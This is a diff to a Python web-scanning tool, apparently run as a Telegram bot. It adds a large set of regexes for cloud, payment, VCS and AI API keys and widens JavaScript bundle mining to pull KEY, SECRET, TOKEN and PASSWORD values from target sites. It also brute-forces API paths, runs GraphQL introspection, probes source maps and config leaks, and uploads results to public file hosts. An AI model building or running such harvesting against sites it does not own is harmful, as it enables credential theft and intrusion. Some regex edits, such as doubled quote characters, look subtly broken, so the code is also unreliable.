+    (r'(?i)aws[_-]?secret[_-]?(?:access[_-]?)?key\s*[=:]\s*["\x27"]?([A-Za-z0-9+/]{40})', '🔴 AWS Secret Key'),
+    (r'FwoGZXIvYXdzE[a-zA-Z0-9/+]{100,}',                                               '🔴 AWS Session Token'),
+    # ── Google / GCP ───────────────────────────────────────────────────
+    (r'AIza[0-9A-Za-z_\-]{35}',                                                          '🟠 Google API Key'),
+    (r'(?i)firebase[_-]?api[_-]?key\s*[=:]\s*["\x27"]?([A-Za-z0-9_\-]{30,})',             '🟠 Firebase Key'),
+    (r'"apiKey"\s*:\s*"(AIza[0-9A-Za-z_\-]{35})"',                                      '🔴 Firebase Config (apiKey)'),
+    (r'https://[a-z0-9\-]+\.firebaseio\.com',                                             '🟡 Firebase DB URL'),
+    (r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',                           '🔴 Google OAuth ClientID'),
+    (r'"type"\s*:\s*"service_account"',                                                   '🔴 GCP Service Account JSON'),
+    # ── Azure ──────────────────────────────────────────────────────────
+    (r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+',               '🔴 Azure Storage ConnStr'),
+    (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\\s"\x27]{10,}',                          '🔴 Azure SAS Token'),
+    # ── Stripe / Payment ───────────────────────────────────────────────
+    (r'sk_live_[0-9a-zA-Z]{24,}',                                                        '🔴 Stripe Secret (LIVE)'),
+    (r'rk_live_[0-9a-zA-Z]{24,}',                                                        '🔴 Stripe Restricted (LIVE)'),
+    (r'sk_test_[0-9a-zA-Z]{24,}',                                                        '🟡 Stripe Secret (test)'),
+    (r'pk_live_[0-9a-zA-Z]{24,}',                                                        '🟡 Stripe Public (LIVE)'),
+    (r'EAAA[a-zA-Z0-9\-_]{60,}',                                                         '🔴 Square Access Token'),
+    (r'rzp_live_[a-zA-Z0-9]{14}',                                                        '🔴 Razorpay Live Key'),
+    (r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',                           '🔴 Braintree Production Token'),
+    # ── GitHub / GitLab / VCS ──────────────────────────────────────────
+    (r'ghp_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub PAT'),
+    (r'github_pat_[a-zA-Z0-9_]{82}',                                                     '🔴 GitHub Fine-grained Token'),
+    (r'gho_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub OAuth Token'),
+    (r'ghs_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub App Token'),
+    (r'ghr_[a-zA-Z0-9]{36}',                                                             '🔴 GitHub Refresh Token'),
+    (r'glpat-[0-9a-zA-Z_\-]{20}',                                                        '🔴 GitLab PAT'),
+    (r'glrt-[0-9a-zA-Z_\-]{20}',                                                         '🟠 GitLab Runner Token'),
+    (r'npm_[A-Za-z0-9]{36}',                                                             '🔴 NPM Publish Token'),
+    # ── Messaging / Email ──────────────────────────────────────────────
+    (r'xox[baprs]-[0-9a-zA-Z\-]+',                                                       '🟠 Slack Token'),
+    (r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+',         '🔴 Slack Webhook'),
+    (r'(?i)discord[_-]?(token|bot)[_-]?[=:]\s*["\x27"]?([A-Za-z0-9_.\-]{50,})',           '🟠 Discord Bot Token'),
+    (r'https://discord(?:app)?\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_\-]+',               '🟠 Discord Webhook'),
+    (r'\d{8,10}:AA[0-9a-zA-Z_\-]{33}',                                                  '🔴 Telegram Bot Token'),
+    (r'SG\.[A-Za-z0-9_\-\.]{20,}',                                                       '🟠 SendGrid API Key'),
+    (r'key-[0-9a-zA-Z]{32}',                                                             '🔴 Mailgun API Key'),
+    (r'[0-9a-f]{32}-us\d{1,2}',                                                          '🔴 Mailchimp API Key'),
+    # ── AI / ML ────────────────────────────────────────────────────────
+    (r'sk-[a-zA-Z0-9]{48}',                                                              '🔴 OpenAI API Key'),
+    (r'sk-proj-[a-zA-Z0-9\-_]{80,}',                                                    '🔴 OpenAI Project Key'),
+    (r'sk-ant-[a-zA-Z0-9\-_]{90,}',                                                     '🔴 Anthropic API Key'),
+    (r'hf_[a-zA-Z]{34}',                                                                 '🟡 HuggingFace Token'),
+    (r'r8_[a-zA-Z0-9]{40}',                                                              '🟠 Replicate API Token'),
+    (r'(?i)openai[_-]?(?:api[_-]?)?key\s*[=:]\s*["\x27"]?(sk-[A-Za-z0-9]{48})',          '🔴 OpenAI Key (env var)'),
+    # ── Database URLs ──────────────────────────────────────────────────
+    (r'mongodb(?:\+srv)?://[^\\s"\x27]<>{}\[\]]{8,}',                                        '🔴 MongoDB URI'),
+    (r'postgres(?:ql)?://[^\\s"\x27]<>{}\[\]]{8,}',                                          '🔴 PostgreSQL URI'),
+    (r'mysql://[^\\s"\x27]<>{}\[\]]{8,}',                                                    '🔴 MySQL URI'),
+    (r'redis://[^\\s"\x27]<>{}\[\]]{8,}',                                                    '🟠 Redis URI'),
+    (r'amqp://[^\\s"\x27]<>{}\[\]]{8,}',                                                     '🟠 RabbitMQ/AMQP URI'),
+    (r'clickhouse://[^\\s"\x27]<>{}\[\]]{8,}',                                               '🟠 ClickHouse URI'),
+    (r'https?://[^:]+:[^@]+@[^\\s"\x27]<>]+:9200',                                          '🔴 Elasticsearch (auth)'),
+    (r'(?i)db[_-]?password\s*[=:]\s*["\x27"]([^\\s"\x27]]{4,})',                               '🔴 DB Password'),
+    # ── JWT / Tokens ───────────────────────────────────────────────────
+    (r'eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}',             '🔴 JWT Token'),
+    (r'(?i)jwt[_-]?secret\s*[=:]\s*["\x27"]([A-Za-z0-9_\-+=/]{16,})',                     '🔴 JWT Secret'),
+    (r'(?i)(?:access[_-]?token|auth[_-]?token)\s*[=:]\s*["\x27"]([A-Za-z0-9_.\-]{20,})', '🟠 Auth/Access Token'),
+    (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',                                             '🟠 Bearer Token'),
+    # ── Private Keys / Certs ───────────────────────────────────────────
+    (r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',                          '🔴 Private Key Block'),
+    (r'-----BEGIN CERTIFICATE-----',                                                      '🟡 Certificate Block'),
+    (r'(?i)ssh-(?:rsa|dss|ed25519|ecdsa)\s+[A-Za-z0-9+/=]{100,}',                     '🔴 SSH Public Key'),
+    # ── SaaS / DevOps ──────────────────────────────────────────────────
+    (r'(?i)openai[_-]?(?:api[_-]?)?key\s*[=:]\s*["\x27"]?(sk-[A-Za-z0-9]{48})',          '🔴 OpenAI Key'),
+    (r'(?i)twilio[_-]?(?:auth[_-]?token|account[_-]?sid)\s*[=:]\s*["\x27"]?([A-Za-z0-9]{32,})', '🟠 Twilio Token'),
+    (r'NRAK-[A-Z0-9]{27}',                                                               '🔴 New Relic API Key'),
+    (r'https://[0-9a-f]{32}@[a-z0-9.]+\.sentry\.io/\d+',                               '🟠 Sentry DSN'),
+    (r'(?i)datadog.{0,20}[0-9a-f]{32}',                                                 '🔴 Datadog API Key'),
+    (r'shpat_[a-fA-F0-9]{32}',                                                           '🔴 Shopify Admin Token'),
+    (r'shpss_[a-fA-F0-9]{32}',                                                           '🔴 Shopify Shared Secret'),
+    (r'secret_[a-zA-Z0-9]{43}',                                                          '🔴 Notion API Token'),
+    (r'hvs\.[a-zA-Z0-9_\-]{24,}',                                                       '🔴 HashiCorp Vault Token'),
+    (r'dp\.pt\.[a-zA-Z0-9]{40,}',                                                       '🔴 Doppler Service Token'),
+    (r'(?i)supabase[_-]?(?:anon|service)[_-]?(?:key|role)["\s:=]+["\x27"][A-Za-z0-9_\-\.]{30,}["\x27"]', '🔴 Supabase Key'),
+    (r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_\-]{20,}',                   '🔴 Supabase JWT (anon/service)'),
+    (r'(?i)planetscale[_-]?(?:password|token)["\s:=]+["\x27"][A-Za-z0-9_\-]{20,}["\x27"]',  '🔴 PlanetScale Token'),
+    (r'(?i)neon[_-]?(?:database[_-]?)?url["\s:=]+["\x27"]postgresql://[^"\x27]{10,}["\x27"]', '🔴 Neon DB URL'),
+    (r'(?i)vercel[_-]?token["\s:=]+["\x27"][A-Za-z0-9_\-]{24,}["\x27"]',                    '🟠 Vercel Token'),
+    (r'(?i)railway[_-]?token["\s:=]+["\x27"][A-Za-z0-9_\-]{40,}["\x27"]',                   '🟠 Railway Token'),
+    (r'pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_\-]{22,}',                                    '🟠 Mapbox Token'),
+    (r'(?i)algolia[_-]?(?:api[_-]?)?key["\s:=]+["\x27"][A-Za-z0-9]{32}["\x27"]',            '🟠 Algolia API Key'),
+    (r'lin_api_[a-zA-Z0-9]{40}',                                                        '🔴 Linear API Key'),
+    (r'dop_v1_[a-f0-9]{64}',                                                            '🔴 DigitalOcean PAT'),
+    # ── Generic High-Risk ──────────────────────────────────────────────
+    (r'(?i)(?:api[_-]?key|apikey|api_token)\s*[=:]\s*["\x27"]([A-Za-z0-9_\-]{20,})',     '🟠 Generic API Key'),
+    (r'(?i)(?:secret[_-]?key|app[_-]?secret)\s*[=:]\s*["\x27"]([A-Za-z0-9_\-]{20,})',   '🟠 Secret Key'),
+    (r'(?i)password\s*[=:]\s*["\x27"]([^\\s"\x27]]{8,})',                                      '🟡 Hardcoded Password'),
+    (r'(?i)private[_-]?key\s*[=:]\s*["\x27"]([A-Za-z0-9_\-+/=]{32,})',                  '🔴 Private Key Value'),
+    (r'(?i)(?:10\.\d{1,3}|192\.168|172\.(?:1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}',   '🟡 Internal IP Leak'),
+    (r'(?i)encryption[_-]?key\s*[=:]\s*["\x27"]([A-Za-z0-9+/=]{16,})',                  '🔴 Encryption Key'),
+    (r'(?i)hmac[_-]?secret\s*[=:]\s*["\x27"]([A-Za-z0-9_\-]{20,})',                     '🟠 HMAC Secret'),
 ]
 
 _ROUTE_PATTERNS = [
-    re.compile(r'''(?:path|exact\s+path)\s*=\s*{?\s*["'`]([/][^"'`\s,)>]{1,100})["'`]'''),
-    re.compile(r'''<Route[^>]+(?:path|to)\s*=\s*["'`]([/][^"'`\s,)>]{1,100})["'`]'''),
+    re.compile(r'''(?:path|exact\s+path)\s*=\s*{?\s*["\x27`]([/][^"\x27`\s,)>]{1,100})["\x27`]'''),
+    re.compile(r'''<Route[^>]+(?:path|to)\s*=\s*["\x27`]([/][^"\x27`\s,)>]{1,100})["\x27`]'''),
     re.compile(r'''pages/([a-z0-9_\-\[\]/]+)\.(?:tsx?|jsx?)''', re.IGNORECASE),
     re.compile(r'''app/([a-z0-9_\-\[\]/]+)/page\.(?:tsx?|jsx?)''', re.IGNORECASE),
-    re.compile(r'''(?:router|app)\s*\.\s*(get|post|put|delete|patch)\s*\(\s*["'`]([^"'`\s]{2,80})["'`]'''),
-    re.compile(r'''path\s*:\s*["'`]([/][^"'`\s,}{]{1,100})["'`]'''),
-    re.compile(r'''path\s*:\s*["'`]([^"'`\s]{2,80})["'`]\s*,\s*component'''),
+    re.compile(r'''(?:router|app)\s*\.\s*(get|post|put|delete|patch)\s*\(\s*["\x27`]([^"\x27`\s]{2,80})["\x27`]'''),
+    re.compile(r'''path\s*:\s*["\x27`]([/][^"\x27`\s,}{]{1,100})["\x27`]'''),
+    re.compile(r'''path\s*:\s*["\x27`]([^"\x27`\s]{2,80})["\x27`]\s*,\s*component'''),
 ]
 
 _XSS_SINK_PATTERNS = [
@@ -2747,8 +2812,8 @@ _XSS_SINK_PATTERNS = [
     (re.compile(r'outerHTML\s*[+]?='),             '🔴 outerHTML assignment'),
     (re.compile(r'document\.write\s*\('),           '🔴 document.write()'),
     (re.compile(r'\beval\s*\('),                    '🔴 eval() call'),
-    (re.compile(r'setTimeout\s*\(\s*["\x27]'),        '🟠 setTimeout(string)'),
-    (re.compile(r'setInterval\s*\(\s*["\x27]'),       '🟠 setInterval(string)'),
+    (re.compile(r'setTimeout\s*\(\s*["\x27"]'),        '🟠 setTimeout(string)'),
+    (re.compile(r'setInterval\s*\(\s*["\x27"]'),       '🟠 setInterval(string)'),
     (re.compile(r'\.html\s*\([^)]{0,200}\+'),       '🟠 jQuery .html() + concat'),
     (re.compile(r'dangerouslySetInnerHTML'),         '🟠 React dangerouslySetInnerHTML'),
     (re.compile(r'v-html\s*='),                     '🟠 Vue v-html'),
@@ -2756,9 +2821,9 @@ _XSS_SINK_PATTERNS = [
 
 _SQLI_SINK_PATTERNS = [
     (re.compile(r'(?i)(?:SELECT|INSERT|UPDATE|DELETE)\s+.*?\+\s*(?:req\.|query\.|param|input|user)'), '🔴 SQL string concat'),
-    (re.compile(r'(?i)(?:query|execute|db\.run)\s*\(\s*["\x27](?:SELECT|INSERT|UPDATE|DELETE).*?\+'),   '🔴 DB query concat'),
+    (re.compile(r'(?i)(?:query|execute|db\.run)\s*\(\s*["\x27"](?:SELECT|INSERT|UPDATE|DELETE).*?\+'),   '🔴 DB query concat'),
     (re.compile(r'(?i)\.raw\s*\([^)]+\+'),                                                             '🟠 Raw ORM query'),
-    (re.compile(r'(?i)f["\x27](?:SELECT|INSERT).*?\{.*?(?:request|user|query)'),                        '🟠 f-string SQL'),
+    (re.compile(r'(?i)f["\x27"](?:SELECT|INSERT).*?\{.*?(?:request|user|query)'),                        '🟠 f-string SQL'),
 ]
 
 _VULN_PACKAGES = {
@@ -2781,8 +2846,8 @@ _VULN_PACKAGES = {
 
 _TOKEN_EXTRACT_PATTERNS = [
     (re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'),              'JWT Token'),
-    (re.compile(r'(?i)"(?:access_token|token|auth_token|id_token|refresh_token|session_id|sessionid|sessionToken)"\s*[:=]\s*["\x27]([A-Za-z0-9_.\-+/]{20,})["\x27]'), 'Access/Session Token'),
-    (re.compile(r'(?i)"(?:api_key|apiKey|api-key|apikey|x-api-key|x-auth-token)"\s*[:=]\s*["\x27]([A-Za-z0-9_.\-]{16,})["\x27]'), 'API Key (JSON)'),
+    (re.compile(r'(?i)"(?:access_token|token|auth_token|id_token|refresh_token|session_id|sessionid|sessionToken)"\s*[:=]\s*["\x27"]([A-Za-z0-9_.\-+/]{20,})["\x27"]'), 'Access/Session Token'),
+    (re.compile(r'(?i)"(?:api_key|apiKey|api-key|apikey|x-api-key|x-auth-token)"\s*[:=]\s*["\x27"]([A-Za-z0-9_.\-]{16,})["\x27"]'), 'API Key (JSON)'),
     (re.compile(r'(?i)Authorization\s*:\s*Bearer\s+([A-Za-z0-9_.\-+/]{20,})'), 'Bearer Token'),
     (re.compile(r'(?i)Authorization\s*:\s*Basic\s+([A-Za-z0-9+/=]{8,})'), 'Basic Auth'),
     (re.compile(r'(?i)X-Auth-Token\s*:\s*([A-Za-z0-9_.\-+/]{20,})'), 'X-Auth-Token'),
@@ -2865,11 +2930,11 @@ def _walk_json_for_api_urls(obj, base_root: str, depth: int = 0) -> list:
 
 
 def _extract_api_urls_from_html(html: str, base_root: str) -> list:
-    """HTML source ထဲက API references mine လုပ် - v2 (deep)"""
+    """HTML source ထဲက API references mine လုပ် — v2 (deep)"""
     found = set()
     soup  = BeautifulSoup(html, 'html.parser')
 
-    # ① All attributes   broadened filter (/v2/, /rpc/, /gql/ etc.)
+    # ① All attributes — broadened filter (/v2/, /rpc/, /gql/ etc.)
     for tag in soup.find_all(True):
         for attr, val in tag.attrs.items():
             if not isinstance(val, str):
@@ -2951,7 +3016,7 @@ def _extract_api_urls_from_html(html: str, base_root: str) -> list:
     return list(found)
 
 
-# -- JS intelligence store (filled each scan) --------------------------------
+# ── JS intelligence store (filled each scan) ────────────────────────────────
 _BUNDLE_INTEL: dict = {'env_vars': {}, 'js_routes': [], 'chunk_urls': []}
 
 _RE_ENV_CAPTURE  = re.compile(
@@ -2988,7 +3053,7 @@ _MANIFEST_PATHS = [
 
 
 def _mine_js_bundles(html: str, root: str, proxies) -> list:
-    """External JS files တွေ download ပြီး API URLs ထုတ် - v2 (deep: manifest + routes + env)"""
+    """External JS files တွေ download ပြီး API URLs ထုတ် — v2 (deep: manifest + routes + env)"""
     global _BUNDLE_INTEL
     _BUNDLE_INTEL = {'env_vars': {}, 'js_routes': [], 'chunk_urls': []}
 
@@ -2999,7 +3064,7 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
     routes  = []
     env_vars: dict = {}
 
-    # -- Collect JS URLs from HTML --------------------------------------------
+    # ── Collect JS URLs from HTML ────────────────────────────────────────────
     for tag in soup.find_all('script', src=True):
         src = tag['src']
         if not src: continue
@@ -3015,7 +3080,7 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
                 js_urls.append(src)
                 seen_js.add(src)
 
-    # -- Phase A: Manifests & well-known (cheap, high yield) -----------------
+    # ── Phase A: Manifests & well-known (cheap, high yield) ─────────────────
     for mp in _MANIFEST_PATHS:
         murl = root + mp
         if murl in seen_js: continue
@@ -3062,7 +3127,7 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
         except Exception as _e:
             logging.debug("Manifest %s: %s", mp, _e)
 
-    # -- Phase B: Common bundle paths not in HTML -----------------------------
+    # ── Phase B: Common bundle paths not in HTML ─────────────────────────────
     _COMMON_BUNDLE_PATHS = [
         '/static/js/main.js', '/assets/js/app.js', '/js/app.js',
         '/dist/bundle.js', '/build/static/js/main.chunk.js',
@@ -3076,11 +3141,11 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
             js_urls.append(full)
             seen_js.add(full)
 
-    # -- Phase C: Deep-mine each JS bundle ------------------------------------
+    # ── Phase C: Deep-mine each JS bundle ────────────────────────────────────
     def _fetch_and_mine(js_url):
-        result = {'urls': [], 'routes': [], 'env': {}}
+        result = {'urls': [], 'routes': [], 'env': {}, 'secrets': []}
         try:
-            r = requests.get(js_url, headers=HEADERS, timeout=12, verify=False)
+            r = requests.get(js_url, headers=HEADERS, timeout=15, verify=False)
             if r.status_code != 200 or len(r.text) < 100:
                 return result
             content = r.text
@@ -3098,15 +3163,27 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
             # Env vars / config values containing URL/API hints
             for m in _RE_ENV_CAPTURE.finditer(content):
                 var_name, var_val = m.group(1), m.group(2)
-                if any(k in var_name for k in ('URL', 'API', 'BASE', 'HOST', 'ENDPOINT', 'SERVICE')):
+                if any(k in var_name for k in ('URL', 'API', 'BASE', 'HOST', 'ENDPOINT', 'SERVICE',
+                                                 'KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'PASS')):
                     result['env'][var_name] = var_val
+
+            # Secret patterns quick-scan
+            for pat, label in _ANALYZE_SECRET_PATTERNS[:30]:  # fast subset
+                try:
+                    for m in set(re.findall(pat, content)):
+                        val = m[-1] if isinstance(m, tuple) else m
+                        if len(val) >= 8:
+                            masked = val[:6] + "···" + val[-4:] if len(val) > 10 else val
+                            result['secrets'].append(f"{label}: `{masked[:60]}`")
+                except Exception:
+                    pass
 
             # Webpack runtime chunk map → discover dynamic import chunks
             if 'webpackChunk' in content or '__webpack_require__' in content:
                 chunk_map = dict(_RE_WEBPACK_MAP.findall(content[:60000]))
                 if chunk_map:
                     base_js = js_url.rsplit('/', 1)[0] + '/'
-                    for cid, chash in list(chunk_map.items())[:40]:
+                    for cid, chash in list(chunk_map.items())[:60]:
                         chunk_url = f"{base_js}{cid}.{chash}.js"
                         result['urls'].append(chunk_url)
 
@@ -3121,8 +3198,9 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
             logging.debug("JS mine %s: %s", js_url, _e)
         return result
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
-        futs = {ex.submit(_fetch_and_mine, u): u for u in js_urls[:60]}
+    js_all_secrets = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
+        futs = {ex.submit(_fetch_and_mine, u): u for u in js_urls[:120]}
         try:
             for fut in concurrent.futures.as_completed(futs, timeout=55):
                 try:
@@ -3131,6 +3209,7 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
                         found.add(url.split('?')[0])
                     routes.extend(res['routes'])
                     env_vars.update(res['env'])
+                    js_all_secrets.extend(res.get('secrets', []))
                 except Exception:
                     pass
         except concurrent.futures.TimeoutError:
@@ -3139,6 +3218,7 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
     # Save intel for report
     _BUNDLE_INTEL['env_vars']  = env_vars
     _BUNDLE_INTEL['js_routes'] = list(set(routes))
+    _BUNDLE_INTEL['js_secrets'] = list(dict.fromkeys(js_all_secrets))[:50]  # deduplicated
 
     # Convert discovered routes to probe URLs
     for route in set(routes):
@@ -3183,10 +3263,10 @@ def _parse_sitemap_urls(url: str, depth: int = 0) -> list:
 
 
 def _check_robots_and_sitemap(root: str, proxies) -> list:
-    """robots.txt + sitemap + .well-known - v2 (full parse)"""
+    """robots.txt + sitemap + .well-known — v2 (full parse)"""
     found = set()
 
-    # -- ① robots.txt   ALL Disallow/Allow paths -----------------------------
+    # ── ① robots.txt — ALL Disallow/Allow paths ─────────────────────────────
     try:
         r = requests.get(root + '/robots.txt', headers=HEADERS, timeout=8, verify=False)
         if r.status_code == 200:
@@ -3208,7 +3288,7 @@ def _check_robots_and_sitemap(root: str, proxies) -> list:
     except Exception as _e:
         logging.debug("robots.txt error: %s", _e)
 
-    # -- ② sitemap.xml standard locations ------------------------------------
+    # ── ② sitemap.xml standard locations ────────────────────────────────────
     for sm_path in ('/sitemap.xml', '/sitemap_index.xml', '/wp-sitemap.xml',
                     '/sitemap-index.xml', '/sitemap/sitemap.xml'):
         try:
@@ -3220,7 +3300,7 @@ def _check_robots_and_sitemap(root: str, proxies) -> list:
         except Exception:
             pass
 
-    # -- ③ .well-known endpoints ----------------------------------------------
+    # ── ③ .well-known endpoints ──────────────────────────────────────────────
     for wk in _WELL_KNOWN_PATHS:
         try:
             r = requests.get(root + wk, headers=HEADERS, timeout=5, verify=False)
@@ -3256,11 +3336,11 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
     parsed  = urlparse(base_url)
     root    = f"{parsed.scheme}://{parsed.netloc}"
 
-    # -- Reuse or build SiteProfile ----------------
+    # ── Reuse or build SiteProfile ────────────────
     domain  = parsed.netloc
     profile = _PROFILE_CACHE.get(domain) or detect_site_profile(base_url)
 
-    # -- Profile-aware path ordering --------------
+    # ── Profile-aware path ordering ──────────────
     # Put CMS-specific paths first so results appear faster
     if profile.is_wordpress:
         priority = _API_PATHS_NEWS + list(_API_PATHS_GENERAL)
@@ -3269,7 +3349,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
         api_workers   = 8 if not (profile.is_cloudflare or profile.has_waf) else 4
         probe_delay   = 0.15 if profile.is_cloudflare else 0.0
         if progress_cb:
-            progress_cb("📝 *WordPress detected*   WP/WooCommerce paths first")
+            progress_cb("📝 *WordPress detected* — WP/WooCommerce paths first")
     elif profile.is_shopify:
         priority = [
             '/products.json', '/collections.json', '/pages.json',
@@ -3282,7 +3362,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
         api_workers   = 6
         probe_delay   = 0.2
         if progress_cb:
-            progress_cb("🛍️ *Shopify detected*   Shopify API paths first")
+            progress_cb("🛍️ *Shopify detected* — Shopify API paths first")
     elif profile.is_spa:
         priority = [
             '/api/graphql', '/graphql', '/api/v1', '/api/v2',
@@ -3293,19 +3373,19 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
         api_workers   = 12
         probe_delay   = 0.0
         if progress_cb:
-            progress_cb("⚛️ *SPA detected*   GraphQL/REST paths first")
+            progress_cb("⚛️ *SPA detected* — GraphQL/REST paths first")
     elif profile.is_cloudflare or profile.has_waf:
         ordered_paths = list(ALL_API_PATHS)
         api_workers   = 5
         probe_delay   = 0.3
         if progress_cb:
-            progress_cb("☁️ *Cloudflare/WAF detected*   slow scan mode")
+            progress_cb("☁️ *Cloudflare/WAF detected* — slow scan mode")
     else:
         ordered_paths = list(ALL_API_PATHS)
         api_workers   = 15
         probe_delay   = 0.0
 
-    # -- Phase 0: Fetch homepage for mining -------
+    # ── Phase 0: Fetch homepage for mining ───────
     homepage_html = None
     try:
         r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False)
@@ -3314,7 +3394,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
     except Exception as _e:
         logging.debug("Scan error: %s", _e)
 
-    # -- Phase 1: HTML + JS mining (parallel) -----
+    # ── Phase 1: HTML + JS mining (parallel) ─────
     html_mined = []
     js_mined   = []
     robots_found = []
@@ -3329,11 +3409,11 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
     if progress_cb: progress_cb("🤖 robots.txt scanning...")
     robots_found = _check_robots_and_sitemap(root, None)
 
-    # -- Phase 2: Path brute-force -----------------
+    # ── Phase 2: Path brute-force ─────────────────
     found  = []
     seen   = set()
 
-    # -- GraphQL introspection query -----------------------------------------
+    # ── GraphQL introspection query ─────────────────────────────────────────
     _GQL_INTROSPECT = {"query": "{__schema{queryType{name}mutationType{name}types{name kind fields(includeDeprecated:false){name type{name kind ofType{name kind}}}}}}"}
     _GQL_INTEL    = {}
     _OPENAPI_EXTRAS = []
@@ -3548,7 +3628,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
             logging.debug("Scan error: %s", _e)
         return None
 
-    # -- Probe paths (profile-ordered) ------------
+    # ── Probe paths (profile-ordered) ────────────
     all_probe_paths = list(ordered_paths)
     # Add mined paths (path-only) at the end
     for mined_url in (html_mined + js_mined + robots_found):
@@ -3559,7 +3639,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
         except Exception as _e:
             logging.debug("Scan error: %s", _e)
 
-    # -- Source-map path detection -----------------
+    # ── Source-map path detection ─────────────────
     # Add .map variants for common JS bundle paths
     _extra_map_paths = []
     for p in all_probe_paths[:]:
@@ -3580,7 +3660,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
         fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
         done = 0
         try:
-            for fut in concurrent.futures.as_completed(fmap, timeout=120):
+            for fut in concurrent.futures.as_completed(fmap, timeout=180):
                 done += 1
                 try:
                     result = fut.result(timeout=8)
@@ -3594,21 +3674,23 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
                         f"🔌 Scanning: `{done}/{total}`\n"
                         f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                         f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
-                        f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
+                        f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}` | "
+                        f"📄 Config: `{sum(1 for e in found if e['type']=='CONFIG_LEAK')}` | "
+                        f"🗺️ SrcMap: `{sum(1 for e in found if e['type']=='SOURCE_MAP')}`"
                     )
                 if probe_delay > 0:
                     time.sleep(probe_delay)
         except concurrent.futures.TimeoutError:
-            # Timeout   cancel remaining, return partial results
+            # Timeout — cancel remaining, return partial results
             for f in fmap:
                 f.cancel()
             if progress_cb:
                 progress_cb(
-                    f"⚠️ Scan timeout   partial results\n"
+                    f"⚠️ Scan timeout — partial results\n"
                     f"✅ Completed: `{done}/{total}` | Found: `{len(found)}`"
                 )
 
-    # -- Merge OpenAPI / GraphQL extracted extras ----------------------------
+    # ── Merge OpenAPI / GraphQL extracted extras ────────────────────────────
     for extra in _OPENAPI_EXTRAS:
         if extra.get("url") and extra.get("url") not in seen:
             seen.add(extra["url"])
@@ -3681,9 +3763,9 @@ def get_internal_links(html: str, base_url: str, soup=None) -> set:
     return links
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # ✂️  FILE SPLITTER
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
     """Fallback: split zip into <SPLIT_MB parts (used only if all file hosts fail)"""
@@ -3778,7 +3860,7 @@ def _upload_gofile(zip_path: str, progress_cb=None) -> str | None:
                 dl_page = f"https://gofile.io/d/{_code}"
 
         # Step 3: Set content options via PATCH (token required)
-        #   No expiry (permanent for account), public access
+        # — No expiry (permanent for account), public access
         if token and content_id:
             try:
                 _req.put(
@@ -3898,7 +3980,7 @@ async def _send_large_file(
     size_str = f"{size_mb:.1f}MB"
 
     _host_errors = []
-    # -- Try file hosts (async wrapper around sync upload) -------------
+    # ── Try file hosts (async wrapper around sync upload) ─────────────
     for _uploader, _host_name in [
         (_upload_gofile,    "gofile.io"),
         (_upload_transfersh, "transfer.sh"),
@@ -3948,9 +4030,9 @@ async def _send_large_file(
             _host_errors.append(f"{_host_name}: {type(e).__name__}")
             logger.warning("filehost %s failed: %s", _host_name, e)
 
-    # -- Fallback: split into parts ------------------------------------
+    # ── Fallback: split into parts ────────────────────────────────────
     err_summary = " | ".join(_host_errors) if _host_errors else "all failed"
-    logger.warning("All file hosts failed (%s) for %s   falling back to split", err_summary, fname)
+    logger.warning("All file hosts failed (%s) for %s — falling back to split", err_summary, fname)
     if msg:
         try:
             await msg.edit_text(
@@ -4006,13 +4088,13 @@ async def _send_large_file(
     return True
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🛡️  VULNERABILITY SCANNER  v4
 #     - Cloudflare catch-all detection
 #     - Baseline fingerprint comparison
 #     - Adaptive delay (anti-rate-limit)
 #     - Real subdomain verification
-# ==================================================
+# ══════════════════════════════════════════════════
 
